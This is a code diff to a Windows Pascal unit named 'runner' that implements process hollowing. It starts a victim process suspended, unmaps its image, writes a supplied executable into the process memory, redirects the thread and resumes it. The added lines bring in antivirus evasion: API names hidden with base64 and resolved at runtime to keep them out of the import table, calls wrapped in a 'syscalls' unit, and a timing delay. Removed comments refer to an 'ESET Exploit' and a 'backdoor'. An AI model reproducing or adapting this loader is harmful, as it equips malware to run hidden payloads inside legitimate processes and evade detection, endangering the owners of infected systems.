@@ -30,34 +30,33 @@ SOFTWARE.
 
  }
 unit runner;
-{$mode Delphi}
+{$mode delphi}
 
 interface
 
-uses Windows;
+uses Windows,SysUtils,base64,classes;
 
 type
   TByteArray = array of Byte;
 
-  function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
-    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;external kernel32 name 'VirtualAllocEx';
 
-   function isEmulated :boolean;
-
-{$IFDEF win64 }
-function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
-{$ENDIF }
+ function isEmulated :boolean;
 
 
-{$IFDEF win32 }
-function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
-{$ENDIF }
+function Fork_P_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
 
-function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';
 
 implementation
+ uses
+   syscalls;
 
 
+
+
+procedure Move_da(Destination, Source: Pointer; dLength:DWORD);
+begin
+  CopyMemory(Destination, Source, dLength);
+end;
 
 function isEmulated :boolean;
 var
@@ -72,110 +71,37 @@ begin
 
 end;
 
-procedure Move(Destination, Source: Pointer; dLength:DWORD);
-begin
-  CopyMemory(Destination, Source, dLength);
-end;
 
 
-{$IFDEF CPU32BITS }
-  function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
- var
-   IDH:        TImageDosHeader;
-   INH:        TImageNtHeaders;
-   ISH:        TImageSectionHeader;
-   PI:         TProcessInformation;
-   SI:         TStartUpInfo;
-   CONT:       TContext;
-   ImageBase:  Pointer;
-   Ret:        DWORD;
-   i:          integer;
-   Addr:       DWORD;
-   dOffset:    DWORD;
- begin
-   Result := FALSE;
-   try
-     Move(@IDH, @bFile[0], 64); //64
-     if IDH.e_magic = IMAGE_DOS_SIGNATURE then
-     begin
-       Move(@INH, @bFile[IDH._lfanew], 248);     //248
-       if INH.Signature = IMAGE_NT_SIGNATURE then
-       begin
-         FillChar(SI, SizeOf(TStartupInfo),#0);
-         FillChar(PI, SizeOf(TProcessInformation),#0);
-         SI.cb := SizeOf(TStartupInfo);
-         if CreateProcess(nil, PChar(sVictim), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
-         begin
-           CONT.ContextFlags := CONTEXT_FULL;
-           if GetThreadContext(PI.hThread, CONT) then
-           begin
-             ReadProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @Addr, 2, Ret);   // it was 4 changed now to 2  //ESET Exploit will be 100 - 2
-             NtUnmapViewOfSection(PI.hProcess, @Addr);
-             ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);
+function Fork_P_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
 
-             WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
-             dOffset := IDH._lfanew + 248;    //248
-             for i := 0 to INH.FileHeader.NumberOfSections - 1 do
-             begin
-               Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
-               WriteProcessMemory(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
-               VirtualProtectEx(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, @Addr);
-             end;
-              WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 10), @ImageBase, 8, Ret);
-          //   WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @ImageBase, 8, Ret);    //small backdoor less than 76kb will be 8 / 4  or 8 / 8
-             // WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 8), @ImageBase, 8, Ret);  //another one
-             CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
-             SetThreadContext(PI.hThread, CONT);
-             ResumeThread(PI.hThread);
-             Result := TRUE;
-           end;
-         end;
-       end;
-     end;
-   finally // except
-  //   CloseHandle(PI.hProcess);
-     CloseHandle(PI.hThread);
-  threadhandle:=PI.hProcess;
- end;
- end;
-
-
-
-{$ELSE }
-
-function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
-const
-  cBufferSize = 2048;
 var
   IDH:        TImageDosHeader;
   INH:        TImageNtHeaders;
   ISH:        TImageSectionHeader;
 
   PI:         TProcessInformation;
-  vSecurityAttributes: TSecurityAttributes;
   SI:         TStartUpInfo;
   CONT,CONT_B:       PContext;
   ImageBase:  pointer;
- // lpimagebase : Dword64;
   Ret:        SIZE_T;
   i:          integer;
   Addr:       DWORD64;
   dOffset:    DWORD;
-  rPipe: THandle;
-  wPipe: THandle;
-  vReadBytes: DWord;
-  vBuffer : Pointer;
+  hmod,hmod_NT,h_sys : Thandle;
+
+
 begin
+
+
   Result := FALSE;
 
 
-
-  //IDH := @bFile;
  CopyMemory(@IDH,@bfile[0], 64);
 
     if IDH.e_magic = IMAGE_DOS_SIGNATURE then
     begin
-      Move(@INH, @bFile[IDH._lfanew], 264);     //248
+      Move_da(@INH, @bFile[IDH._lfanew], 264);     //248
 
       if INH.Signature = IMAGE_NT_SIGNATURE then
       begin
@@ -183,66 +109,87 @@ begin
         FillChar(PI, SizeOf(TProcessInformation),#0);
         SI.cb := SizeOf(TStartupInfo);
 
+        // Hide from IAT
+        hmod := LoadLibrary('kernel32.dll');
+        CP := GetProcAddress(hmod,Pchar(DecodeStringBase64(CP_V)));
+        Get_Con := GetProcAddress(hmod,'GetThreadContext');
+        set_Con := GetProcAddress(hmod,'SetThreadContext');
 
-
-        if CreateProcess(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then
+        if syscalls.CP(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then
 
         begin
+           Alloc := GetProcAddress(hmod,'VirtualAlloc');
 
-
-          CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
-
-
-
+          CONT := PCONTEXT(Alloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
           CONT.ContextFlags := CONTEXT_ALL;
 
-          if GetThreadContext(PI.hThread, CONT^) then
+
+
+          if syscalls.Get_Con(PI.hThread, CONT^) then
           begin
-            ReadProcessMemory(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, 2, Ret);
+
+            hmod := LoadLibrary('kernel32.dll');
+            RPM := GetProcAddress(hmod,Pchar(DecodeStringBase64(RPM_V)));
+
+            syscalls.RPM(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, 4, Ret);
+
+          //   hmod := LoadLibrary('kernel32.dll');
+            Allocx := GetProcAddress(hmod,'VirtualAllocEx');
+            res_thread := GetProcAddress(hmod,Pchar(DecodeStringBase64(Rs_thread)));
+
+            h_sys := LoadLibrary('ntdll.dll');
+        gg := GetProcAddress(h_sys,'NtAllocateVirtualMemory');
+
+            hmod_NT := loadLibrary('ntdll.dll');
+            Nt := GetProcAddress(hmod_NT,'NtUnmapViewOfSection');
+            W_M := GetprocAddress(hmod,Pchar(DecodeStringBase64(WPM)));
 
 
-          //  NtUnmapViewOfSection(PI.hProcess, @Addr);
+
+
              if Addr = INH.OptionalHeader.ImageBase then
               begin
-             if NtUnmapViewOfSection(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
+             if syscalls.Nt(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
              begin
-            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
+            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
              $3000, PAGE_EXECUTE_READWRITE);
              end
                else
               begin
-              ImageBase := VirtualAllocEx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
+              ImageBase := syscalls.Allocx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
              end;
             end
             else
             begin
-            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
+            ImageBase := syscalls.Allocx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
             $3000, PAGE_EXECUTE_READWRITE);
 
               end;
 
-            WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
+            syscalls.W_M(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
 
             dOffset := IDH._lfanew + 264;    //248
             for i := 0 to INH.FileHeader.NumberOfSections - 1 do
             begin
-              Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
-              WriteProcessMemory(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
-              WriteProcessMemory(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
+              Move_da(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
+
+              syscalls.W_M(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
+
+              syscalls.W_M(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
             end;
 
 
                 //setup another contex with different flags
-               CONT_B := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
+               CONT_B := PCONTEXT(Syscalls.Alloc(nil, sizeof(CONT_B), MEM_COMMIT, PAGE_READWRITE));
                CONT_B.ContextFlags := CONTEXT_INTEGER;
 
+               // put some timing before setting thread
+                  sleep(2000);
                 // set thread context
-              CONT_B.RCX := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
+              CONT_B.rcx := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
 
-
-
-            SetThreadContext(PI.hThread, CONT_B^);
-            ResumeThread(PI.hThread);
+            syscalls.set_Con(PI.hThread, CONT_B^);
+            syscalls.res_thread(PI.hThread);
 
             Result := TRUE;
 
@@ -250,14 +197,9 @@ begin
         end;
       end;
     end;
- // finally // except
- ////   CloseHandle(PI.hProcess);
- //   CloseHandle(PI.hThread);
-//threadhandle:=PI.hProcess;
-//end;
-//end;
+
 end;
-{$ENDIF }
+
 
 
 
